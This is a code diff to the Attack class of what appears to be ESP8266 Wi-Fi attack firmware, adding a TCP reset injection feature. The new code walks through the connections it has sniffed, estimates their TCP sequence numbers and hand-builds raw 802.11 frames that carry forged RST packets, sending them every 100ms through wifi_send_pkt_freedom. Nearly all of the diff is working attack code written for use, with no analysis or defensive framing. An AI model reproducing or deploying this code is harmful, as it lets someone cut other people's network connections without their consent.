@@ -165,6 +165,7 @@ void Attack::update() {
     deauthAllUpdate();
     beaconUpdate();
     probeUpdate();
+    updateRST();
 
     // each second
     if (currentTime - attackTime > 1000) {
@@ -470,4 +471,93 @@ uint32_t Attack::getProbeMaxPkts() {
 
 uint32_t Attack::getPacketRate() {
     return packetRate;
+}
+
+void Attack::startRST(uint32_t timeout) {
+    rst.active  = true;
+    rst.time    = currentTime;
+    rst.start   = currentTime;
+    rst.timeout = timeout;
+}
+
+void Attack::stopRST() {
+    rst.active = false;
+}
+
+void Attack::updateRST() {
+    if (!rst.active) return;
+    if ((rst.timeout > 0) && (currentTime - rst.start > rst.timeout)) {
+        stopRST();
+        return;
+    }
+    if (currentTime - rst.time < 100) return; // 100ms rate
+    rst.time = currentTime;
+    int c = scan.connectionCount();
+    for (int i = 0; i < c; i++) {
+        connection_info ci = scan.getConnection(i);
+        float dt = float(currentTime - ci.ts);
+        uint32_t seq = ci.seq + uint32_t(ci.seq_rate * dt);
+        sendRSTPacket(ci, seq);
+    }
+}
+
+bool Attack::sendRSTPacket(const connection_info& ci, uint32_t seq) {
+    uint8_t buf[96];
+    memset(buf, 0, sizeof(buf));
+    // 802.11 header
+    buf[0] = 0x08; buf[1] = 0x00;
+    memcpy(buf + 4, ci.dst_mac, 6);
+    memcpy(buf + 10, ci.src_mac, 6);
+    memcpy(buf + 16, ci.dst_mac, 6);
+    // LLC header
+    uint8_t* llc = buf + 24;
+    llc[0] = 0xAA; llc[1] = 0xAA; llc[2] = 0x03;
+    llc[3] = 0x00; llc[4] = 0x00; llc[5] = 0x00;
+    llc[6] = 0x08; llc[7] = 0x00; // IPv4
+    uint8_t* ip = llc + 8;
+    ip[0] = 0x45; ip[1] = 0x00;
+    uint16_t ip_len = 20 + 20;
+    ip[2] = ip_len >> 8; ip[3] = ip_len & 0xFF;
+    ip[4] = 0x00; ip[5] = 0x00;
+    ip[6] = 0x40; ip[7] = 0x00;
+    ip[8] = 64; ip[9] = 6;
+    ip[10] = 0; ip[11] = 0;
+    ip[12] = (ci.src_ip >> 24) & 0xFF;
+    ip[13] = (ci.src_ip >> 16) & 0xFF;
+    ip[14] = (ci.src_ip >> 8) & 0xFF;
+    ip[15] = ci.src_ip & 0xFF;
+    ip[16] = (ci.dst_ip >> 24) & 0xFF;
+    ip[17] = (ci.dst_ip >> 16) & 0xFF;
+    ip[18] = (ci.dst_ip >> 8) & 0xFF;
+    ip[19] = ci.dst_ip & 0xFF;
+    uint16_t ip_sum = calcChecksum(ip, 20);
+    ip[10] = ip_sum >> 8; ip[11] = ip_sum & 0xFF;
+    uint8_t* tcp = ip + 20;
+    tcp[0] = ci.src_port >> 8; tcp[1] = ci.src_port & 0xFF;
+    tcp[2] = ci.dst_port >> 8; tcp[3] = ci.dst_port & 0xFF;
+    tcp[4] = (seq >> 24) & 0xFF; tcp[5] = (seq >> 16) & 0xFF; tcp[6] = (seq >> 8) & 0xFF; tcp[7] = seq & 0xFF;
+    tcp[8] = 0; tcp[9] = 0; tcp[10] = 0; tcp[11] = 0;
+    tcp[12] = (5 << 4); tcp[13] = 0x04; // RST
+    tcp[14] = 0; tcp[15] = 0; tcp[16] = 0; tcp[17] = 0; tcp[18] = 0; tcp[19] = 0;
+    uint32_t sum = 0;
+    sum += (ci.src_ip >> 16) & 0xFFFF;
+    sum += ci.src_ip & 0xFFFF;
+    sum += (ci.dst_ip >> 16) & 0xFFFF;
+    sum += ci.dst_ip & 0xFFFF;
+    sum += 0x0006;
+    sum += 20;
+    uint16_t tcp_sum = calcChecksum(tcp, 20, sum);
+    tcp[16] = tcp_sum >> 8; tcp[17] = tcp_sum & 0xFF;
+    uint16_t frame_len = 24 + 8 + 20 + 20;
+    wifi_send_pkt_freedom(buf, frame_len, 0);
+    return true;
+}
+
+uint16_t Attack::calcChecksum(const uint8_t* buf, uint16_t len, uint32_t sum) {
+    for (uint16_t i = 0; i < (len & ~1); i += 2) {
+        sum += (buf[i] << 8) | buf[i + 1];
+    }
+    if (len & 1) sum += buf[len - 1] << 8;
+    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
+    return ~sum;
 }
